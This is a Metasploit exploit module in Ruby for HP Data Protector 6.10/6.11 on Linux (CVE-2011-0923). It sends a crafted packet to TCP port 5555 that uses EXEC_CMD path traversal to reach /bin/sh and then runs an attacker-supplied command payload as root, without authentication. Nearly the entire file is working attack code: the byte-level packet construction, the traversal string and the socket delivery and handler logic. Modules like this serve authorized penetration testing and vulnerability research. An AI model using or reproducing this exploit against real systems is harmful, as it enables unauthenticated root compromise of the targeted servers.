##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'HP Data Protector 6.1 EXEC_CMD Remote Code Execution',
			'Description'     => %q{
				This exploit abuses a vulnerability in the HP Data Protector service. This
				flaw allows an unauthenticated attacker to take advantage of the EXEC_CMD
				command and traverse back to /bin/sh, this allows arbitrary remote code
				execution under the context of root.
			},
			'Author'          =>
				[
					'ch0ks',    # poc
					'c4an',     # msf poc
					'wireghoul' # Improved msf
				],
			'References'      =>
				[
					[ 'CVE', '2011-0923'],
					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-055/'],
					[ 'URL', 'http://c4an-dl.blogspot.com/hp-data-protector-vuln.html'],
					[ 'URL', 'http://hackarandas.com/blog/2011/08/04/hp-data-protector-remote-shell-for-hpux']
				],
			'DisclosureDate'  => 'Feb 7 2011',
			'Platform'        => [ 'unix','linux'],
			'Arch'            => ARCH_CMD,
			'Payload'         =>
				{
					'Space'       => 10000,
					'DisableNops' => true,
					'Compat'      => { 'PayloadType' => 'cmd' }
				},
			'Targets'         =>
				[
					[ 'HP Data Protector 6.10/6.11 on Linux', {}]
				],
			'DefaultTarget'   => 0
		))

		register_options([Opt::RPORT(5555),], self.class)
	end

	def exploit

		user = rand_text_alpha(4)

		packet = "\x00\x00\x00\xa4\x20\x32\x00\x20"
		packet << user*2
		packet << "\x00\x20\x30\x00\x20"
		packet << "SYSTEM"
		packet << "\x00\x20\x63\x34\x61\x6e"
		packet << "\x20\x20\x20\x20\x20\x00\x20\x43\x00\x20\x32\x30\x00\x20"
		packet << user
		packet << "\x20\x20\x20\x20\x00\x20"
		packet << "\x50\x6f\x63"
		packet << "\x00\x20"
		packet << "NTAUTHORITY"
		packet << "\x00\x20"
		packet << "NTAUTHORITY"
		packet << "\x00\x20"
		packet << "NTAUTHORITY"
		packet << "\x00\x20\x30\x00\x20\x30\x00\x20"
		packet << "../../../../../../../../../../"

		shell_mio = "bin/sh"
		salto = "\n"
		s = salto.encode

		shell = shell_mio
		shell << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		shell << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		shell << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
		shell << payload.encoded
		shell << s

		sploit = packet + shell

		begin
			print_status("Sending our commmand...")
			connect
			sock.put(sploit)
			print_status("Waiting ...")
			handler

			# Read command output from socket if cmd/unix/generic payload was used
			if (datastore['CMD'])
				res = sock.get
				print_status(res.to_s) if not res.empty?
			end

		rescue
			print_error("Error in connection or socket")
		ensure
			disconnect
		end
	end

end